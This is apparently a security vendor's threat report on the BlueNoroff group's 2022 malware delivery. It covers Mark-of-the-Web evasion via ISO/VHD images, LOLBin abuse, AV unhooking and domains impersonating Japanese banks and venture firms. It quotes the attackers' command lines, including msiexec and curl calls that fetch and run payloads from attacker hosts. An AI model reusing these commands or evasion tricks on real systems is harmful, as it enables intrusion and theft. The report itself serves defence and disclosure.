We\n[have published technical details of how this notorious group steals cryptocurrency before. We continue to](https://securelist.com/the-bluenoroff-cryptocurrency-hunt-is-still-on/105488/)\ntrack the group’s activities and this October we observed the adoption of new malware strains in its arsenal.\nThe group usually takes advantage of Word documents and uses shortcut files for the initial intrusion.\nHowever, it has recently started to adopt new methods of malware delivery.\n\nThe first new method the group adopted is aimed at evading the Mark-of-the-Web (MOTW) flag, the security\nmeasure whereby Windows displays a warning message when the user tries to open a file downloaded from\nthe internet. To do this, optical disk image (.iso extension) and virtual hard disk (.vhd extension) file formats\nwere used. This is a common tactic used nowadays to evade MOTW, and BlueNoroff has also adopted it.\n\nIn addition, the group tested different file types to refine malware delivery methods. We observed a new\nVisual Basic Script, a previously unseen Windows Batch file, and a Windows executable. It seems the\nactors behind BlueNoroff are expanding or experimenting with new file types to convey their malware\nefficiently.\n\n\n-----\n\nAfter researching the infrastructure that was utilized, we discovered more than 70 domains used by this\ngroup, meaning they were very active until recently. Also, they created numerous fake domains that look like\nventure capital and bank domains. Most of the domains imitate Japanese venture capital companies,\nindicating that the group has an extensive interest in Japanese financial entities.\n\n## Executive summary\n\nBlueNoroff group introduced new file types to evade Mark-of-the-Web (MOTW) security measures;\nBleuNoroff group expanded file types and tweaked infection methods;\nBlueNoroff created numerous fake domains impersonating venture capital companies and banks.\n\n## Background\n\nAt the end of September 2022, we observed new BlueNoroff malware in our telemetry. After a careful\ninvestigation, we confirmed that the actor had adopted new techniques to convey the final payload. The\nactor took advantage of several scripts, including Visual Basic Script and Windows Batch script. They also\nstarted using disk image file formats, .iso and .vhd, to deliver their malware. For intermediate infection, the\nactor introduced a downloader to fetch and spawn the next stage payload. Although the initial intrusion\nmethods were very different in this campaign, the final payload that we had analyzed previously was used\nwithout significant changes.\n\n**_Novel infection chain_**\n\n## Long-lasting initial infection\n\nBased on our telemetry, we observed that one victim in the UAE was attacked using a malicious Word\ndocument. The victim received a document file named “Shamjit Client Details Form.doc” on September 2,\n2022. Unfortunately, we couldn’t acquire the document, but it was executed from the following path:\n\n\n-----\n\n```\nC:\\Users\\[username]\\Desktop\\SALES OPS [redacted]\\[redacted]\\Signed Forms & Income\nDocs\\Shamjit Client Details Form.doc\n\n```\nJudging from the file path, we can assume that the victim was an employee in the sales department\nresponsible for signing contracts.\n\nUpon launch, the malicious document connects to the remote server and downloads the payload. In this\nparticular case, the executable ieinstal.exe was used to bypass UAC.\n\nRemote URL:\nhttps://bankofamerica.us[.]org/lsizTZCslJm/W+Ltv_Pa/qUi+KSaD/_rzNkkGuW6/cQHgsE=\nCreated payload path: %Profile%\\cr.dat\nSpawned command: cmd.exe %Profile%\\cr.dat 5pKwgIV5otiKb6JrNddaVJOaLjMkj4zED238vIU=\n\nAfter initial infection, we observed several keyboard hands-on activities by the operator. Through the\nimplanted backdoor, they attempted to fingerprint the victim and install additional malware with high\nprivileges. Upon infection, the operator executed several Windows commands to gather basic system\ninformation. They then returned 18 hours later to install further malware with high privileges.\n\n**_Post-exploitation_**\n\nBased on our telemetry, when the malicious Word document opens it fetches the next payload from the\nremote server:\n\nDownload URL: http://avid.lno-prima[.]lol/VcIf1hLJopY/shU_pJgW2Y/KvSuUJYGoa/sX+Xk4Go/gGhI=\n\nThe fetched payload is supposed to be saved in %Profile%\\update.dll. Eventually, the fetched file is\nspawned with the following commands:\n\nCommand #1: rundll32.exe %Profile%\\update.dll,#1\n5pOygIlrsNaAYqx8JNZSTouZNjo+j5XEFHzxqIIqpQ==\nCommand #2: rundll32.exe %Profile%\\update.dll,#1 5oGygYVhos+IaqBlNdFaVJSfMiwhh4LCDn4=\n\nOne of the other [methods the BlueNoroff group usually uses is a ZIP archive with a shortcut file. The archive](https://securelist.com/the-bluenoroff-cryptocurrency-hunt-is-still-on/105488/)\nfile we recently discovered contained a password-protected decoy document and a shortcut file named\n“Password.txt.lnk“. This is a classic BlueNoroff strategy to persuade the victim to execute the malicious\nshortcut file to acquire the decoy document’s password. The latest archive file (MD5\n1e3df8ee796fc8a13731c6de1aed0818) discovered has a Japanese file name, 新しいボーナススケジュー\nル.zip (Japanese for “New bonus schedule”), indicating they were interested in Japanese targets.\n\n\n-----\n\nThe main difference from the previous shortcut sample was that it fetched an additional script payload\n(Visual Basic Script or HTML Application); also, a different method of fetching and executing the next stage\npayload was adopted at this time. The command below was executed when the victim double-clicked on the\nshortcut file:\n\n\n1\n\n2\n\n3\n\n4\n\n\ncmd.exe /c DeviceCredentialDeployment & echo jbusguid> %APPDATA%\\Pass.txt & start\n\n%APPDATA%\\Pass.txt && FOR %i IN (%systemroot%\\system32\\msiexec.*) DO msiexec -c /Q /i\n\nhxxps://www.capmarketreport[.]com/packageupd.msi?ccop=RoPbnVqYd & timeout\n\n\nTo evade detection, the actor utilized Living Off the Land Binaries (LOLBins). The\nDeviceCredentialDeployment execution is a well-known LOLBin used to hide the command’s windows. The\nactor also abused the msiexe.exe file to silently launch the fetched Windows Installer file.\n\n## Updated method #1: Tricks to evade MOTW flag\n\nWe observed that the actor examined different file types to deliver their malware. Recently, many threat\nactors have adopted image files to avoid MOTW (Mark-of-the-Web). In a nutshell, MOTW is a mitigation\ntechnique introduced by Microsoft. The NTFS file system marks a file downloaded from the internet, and\nWindows handles the file in a safe way. For example, when a Microsoft Office file is fetched from the\ninternet, the OS opens it in Protected View, which restricts the execution of the embedded macro. In order to\navoid this mitigation technique, more threat actors have started abusing ISO file types. The BlueNoroff\ngroup likely experimented with ISO image files to deliver their malware. Although it’s still under\ndevelopment, we mention this sample as an early warning. This ISO image file contains one PowerPoint\nslide show and one Visual Basic Script.\n\n**_Embedded files of ISO image_**\n\nThe Microsoft PowerPoint file contains a link. When the user clicks the link, it executes the 1.vbs file through\nthe WScript process. When we checked the VBS file, it only generated an “ok” message, which suggests\nBlueNoroff is still experimenting with this method.\n\n\n1\n\n2\n\n\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n\n<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">\n<Relationship Id=\"rId2\"\nType=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink\"\nTarget=\"wscript%201.vbs\" TargetMode=\"External\"/><Relationship Id=\"rId1\"\nType=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout\"\nTarget=\"../slideLayouts/slideLayout1.xml\"/></Relationships>\n\n\n-----\n\nBased on our other findings, we discovered an in-the-wild sample (MD5\n[a17e9fc78706431ffc8b3085380fe29f) from VirusTotal. At the time of analysis, this .vhd sample wasn’t](https://opentip.kaspersky.com/a17e9fc78706431ffc8b3085380fe29f/)\ndetected by any antivirus. The virtual disk file contains a decoy PDF file, Windows executable file, and an\nencrypted Dump.bin file. The PDF and executable files have numerous spaces before the file extension to\nhide it and allay suspicions.\n\n**_Files inside VHD a file_**\n\n[The Job_Description[spaces].exe file (MD5 931d0969654af3f77fc1dab9e2bd66b1) is a loader that loads the](https://opentip.kaspersky.com/931d0969654af3f77fc1dab9e2bd66b1/)\nnext stage payload. Upon launch, it copies the ​Dump.bin file to the ​%Templates%\\war[current time][random\n_value].bin (i.e., war166812964324445.bin). The Dump.bin has a modified PE header. The malware reads_\nthe first byte of Dump.bin, 0xAF in this file, and decodes 0x3E8 bytes with that key. The decrypted data is\nthe header of a PE file, overwriting the recovered header to the original file. Eventually, it loads the\ndecrypted DLL file by spawning the ordinary first export function.\n\nThe spawned downloader contains an encrypted configuration at the end of the file. The malware first\nacquires the total size of the configuration data and the length of the payload URL from the end of the file.\nThey are located four bytes and eight bytes from the end of the file, respectively. The malware decrypts the\nconfiguration data with the RC4 algorithm using an embedded 64-byte key.\n\nRC4 key: 46 61 44 6D 38 43 74 42 48 37 57 36 36 30 77 6C 62 74 70 79 57 67 34 6A 79 4C 46 62 67\n52 33 49 76 52 77 36 45 64 46 38 49 47 36 36 37 64 30 54 45 69 6D 7A 54 69 5A 36 61 42 74 65 69\n67 50 33\nRestored URL: hxxps://docs.azureprotection[.]cloud/EMPxSKTgrr3/2CKnoSNLFF/0d6rQrBEMv/gGFroIw5_m/n9hLXkEOy3/wyQ%3D%3D\n\n\n-----\n\n**_Structure of configuration_**\n\nIn the case of another downloader, however, the payload URL was delivered using a command line\n[parameter. Also, some of the other downloaders (MD5 f766f97eb213d81bf15c02d4681c50a4) have](https://opentip.kaspersky.com/f766f97eb213d81bf15c02d4681c50a4/)\nfunctionality that checks the working environment. If the size of physical memory is less than 2,147,483,648\nbytes, the malware terminates execution.\n\n**_Infection flow of downloader_**\n\nThis downloader checks for the names of the following antivirus vendors: Sophos, Kaspersky, Avast, Avira,\nBitdefender, TrendMicro, and Windows Defender. If TrendMicro, BitDefender, or Windows Defender\n[products are installed, the malware conducts a classic unhooking DLL trick intended to remove user-mode](https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++)\nhooks from the system library. This evasion technique overwrites the .text section of the pre-loaded ntdll\nlibrary with the freshly loaded one so that the hooked API addresses are recovered with the original API\naddress. With this trick, the malware can disable the functionalities of EDR/AV products. Next, the malware\ncreates a mutex to avoid duplicate execution.\n\nMutex name: da9f0e7dc6c52044fa29bea5337b4792b8b873373ba99ad816d5c9f5f275f03f\n\nNext, the malware opens a PDF decoy document in the same directory. The decoy document masquerades\nas a job offer from a Japanese multinational bank.\n\nIf Windows Defender or Bitdefender Antivirus is installed on the victim’s computer, the malware executes\nitself with the following commands:\n\nWindows Defender: cmd /c timeout /t 10 & Del /f /q \\”[current file name]\\” & attrib -s -h \\”[PDF decoy\n_file]\\” & rundll32 \\”[current DLL file path]\\” #1_\nBitdefender: cmd /c timeout /t 10 & rundll32 \\”[current DLL file path]\\” #1\n\n\n-----\n\nThe primary objective of this malware is to fetch the next stage payload. To do this, the malware uses the\ncURL library, combining cURL commands depending on the antivirus installed.\n\nAvira or Avast installed: curl -A cur1-agent -L [payload URL(| -x proxy URL)] -s -d da\nOther cases: curl -A cur1-agent -L [payload URL(| -x proxy URL)] -s -d dl\n\nNote that the user-agent name is “cur1-agent“, and the malware sends “da” POST data if the victim\ninstalled Avira or Avast; otherwise, the malware sends “dl” POST data. If the fetched data by cURL\ncommand contains “<html>” and “curl:”, the malware decrypts the payload with a delivered 64-byte RC4 key.\n\nIf Avira or Avast are installed, the malware saves the decrypted payload to “%TEMPLATES%\\marcoor.dll”\nand spawns it with the rundll32.exe command with the payload URL.\n\ncommand: exe %TEMPLATES%\\marcoor.dll #1 [payload URL]\n\nOtherwise, the malware doesn’t write the payload to the file and injects the fetched payload into the\nexplorer.exe process. The fetched payload is a DLL type executable and its export function is spawned with\nthe “payload URL”.\n\nUnfortunately, we haven’t been able to obtain a precise infection chain so far. From our telemetry, however,\nwe can confirm the victim was eventually compromised by backdoor-type malware. Based on the malware’s\nstatic information, and parts of the internal code, we assess that the final payload is still very similar to the\nPersistence Backdoor #2[1] [we described in our previous blog.](https://securelist.com/the-bluenoroff-cryptocurrency-hunt-is-still-on/105488/)\n\n## Updated method #2: Scripts and novel downloader\n\nAdditionally, we observed the download and launch of a suspicious batch file. The actor exploited different\nLOLBins. The malware execution is done using a legitimate script, SyncAppvPublishingServer.vbs, in the\nsystem folder. This script is for executing the PowerShell script via a Windows scheduled task.\n\n1 WScript.exe \"%system32%\\SyncAppvPublishingServer.vbs\" \"n;cmd.exe '/c curl\nperseus.bond/Dgy_0dU08lC/hCHEdlDFGV/P89bXhClww/uiOHK5H35B/bM%3D -A cur1-agent -o\n%public%\\regsile.bat & start /b %public%\\regsile.bat'\n\nWe also observed the context around that batch file in our telemetry. The batch file name is “What is\n_Blockchain.bat“. As the file name suggests, this group still targets the blockchain industry. We acquired the_\nscriptlet of the batch file.\n\n\n1\n\n2\n\n3\n\n\nxcopy /h /y /q How-To-Extension.pdf c:\\users\\public\\Inproc.exe*\n\nstart xcopy /h /y /q Blockchain-old.pdf c:\\users\\public\\rwinsta.exe*\n\nstart c:\\users\\public\\Inproc.exe \"%cd%\\Blockchain.pdf\"\n\n\n[The Inproc.exe is a legitimate mshta.exe file (MD5 0b4340ed812dc82ce636c00fa5c9bef2), and the](https://opentip.kaspersky.com/0b4340ed812dc82ce636c00fa5c9bef2/)\n[rwinsta.exe is a legitimate rundll32.exe file (MD5 ef3179d498793bf4234f708d3be28633).

Unfortunately,\nwe don’t have the HTA script (Blockchain.pdf), but we can assume the functionality of the script based on\nour telemetry – showing the decoy document and fetching the next stage payload.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n\n# Create a decoy password file and open it.\n\ncmd.exe\" /c echo {PASSWORD}>%documents%\\Userlink & notepad.exe %documents%\\Userlink\n\n# Fetch the payload with cURL command and execute.\n\ncmd.exe\" /c timeout 10 & curl\nperseus.bond/VcIf1hLJopY/shU_pJgW2Y/NX4SoGYuka/iiOHK5H35B/bM%3D -s -d md -A cur1-agent\n-o %documents%\\macroor.dll& %documents%\\macroor.dll #1\nperseus.bond/VcIf1hLJopY/shU_pJgW2Y/NX4SoGYuka/iiOHK5H35B/bM%3D\n\n\nAlso, we observed this group introduce a new Windows executable-type downloader at this time. This\n[malware (MD5 087407551649376d90d1743bac75aac8) spawns a fake password file while fetching a](https://opentip.kaspersky.com/087407551649376d90d1743bac75aac8/)\nremote payload and executing it. Upon execution, it creates a fake file (wae.txt) to show a password\ncomposed of the string ‘password’ and fetches a payload from the embedded URL and loads it. This\nscheme, showing a password via notepad.exe, is a trick favored by the BlueNoroff group to avoid arousing\nthe victim’s suspicion. Usually, the password contains the password needed to open the supplied encrypted\ndecoy document.\n\n**_Simple downloader with fake password file_**\n\nIt’s possible that the actor delivered the above Windows executable file in archive file format or disk image\nfile format with an encrypted decoy document.\n\n## Infrastructure\n\nWhile carrying out this research we found several C2 servers used by the actor. All the servers are hosted\nby VPS vendors as usual and several of them were resolved to the same IP address. The domain\nregistration could be traced back to earlier in 2021, so this is an ongoing operation by the adversary.\n\n**Domain** **IP** **ISP** **ASN**\n\n\nofferings.cloud\n\ndocs.azure-protection.cloud\n\nbankofamerica.us.org\n\nperseus.bond\n\navid.lno-prima.lol\n\n\n104.168.174.80 Hostwinds LLC.

They also created fake domains disguised as legitimate companies in the financial industry and\ninvestment companies. The domains, including pivoted domains, imitate venture capital names or big bank\nnames. Most of the companies are Japanese companies, indicating the actor has a keen interest in\nJapanese markets.\n\n**Malicious domains** **Genuine company** **Category of business** **Country**\n\n\nbeyondnextventures.co\n\ncloud.beyondnextventures.co\n\nsmbc.ltd\n\nsmbcgroup.us\n\nsmbc-vc.com\n\ncloud.mufg.tokyo\n\nmufg.tokyo\n\n\nBeyond Next Ventures\n\n(https://beyondnextventures.com)\n\nSumitomo Mitsui Banking\nCorporation\n\n(https://www.smbc.co.jp)\n\nMitsubishi UFJ Financial Group\n\n(https://www.mufg.jp)\n\n\nVenture capital firm Japan\n\n\nJapanese multinational\nbanking and financial\nservices\n\n\nJapan\n\n\nvote.anobaka.info ANOBAKA\n\n(https://anobaka.jp)\n\nit.zvc.capital Z Venture Capital\n\n(https://zvc.vc)\n\nabf-cap.co ABF Capital\n\n(https://www.abf-cap.com)\n\nangelbridge.capital Angel Bridge\n\n(https://www.angelbridge.jp)\n\n\nmizuhogroup.us\n\ncareers.mizuhogroup.us\n\nbankofamerica.tel\n\nbankofamerica.nyc\n\nbankofamerica.us.org\n\ntptf.us\n\ntptf.ltd\n\n## Victims\n\n\nMizuho Financial Group\n\n(https://www.mizuhogroup.com)\n\nBank of America\n\n(https://www.bankofamerica.com)\n\n​Trans-Pacific Technology Fund\n\n(https://tptf.co)\n\n\nBank in Japan Japan\n\nVenture capital firm Japan\n\nVenture capital firm Japan\n\nVenture capital firm Japan\n\nVenture capital firm Japan\n\nBanking holding company Japan\n\n\nBank and financial\nservices holding company\n\n\nUSA\n\n\nVenture capital firm Taiwan\n\n\nAs we described in the section ‘Long-lasting initial infection’, we discovered that one victim in the UAE,\nprobably a home financing company, was compromised by classic BlueNoroff group malware. This\nfinancially motivated threat actor has been attacking various cryptocurrency-related businesses lately but\n\n\n-----\n\nalso other financial companies, as in this case.\n\nIn addition, based on the domain naming and decoy documents, we assume, with low confidence, that the\nentities in Japan are on the radar of this group. In one PowerPoint sample, we observed that the actor took\nadvantage of a Japanese venture capital company. Also, the samples we mentioned in the ‘Long-lasting\ninitial infection’ section above were delivered to the victim with a Japanese file name, suggesting the target\ncan read Japanese.\n\n**_Decoy document_**\n\n## Conclusion\n\n[According to a recent report, the BlueNoroff group stole cryptocurrency worth millions using their](https://edition.cnn.com/2022/07/10/politics/north-korean-hackers-crypto-currency-firms-infiltrate/index.html)\ncyberattack capabilities.
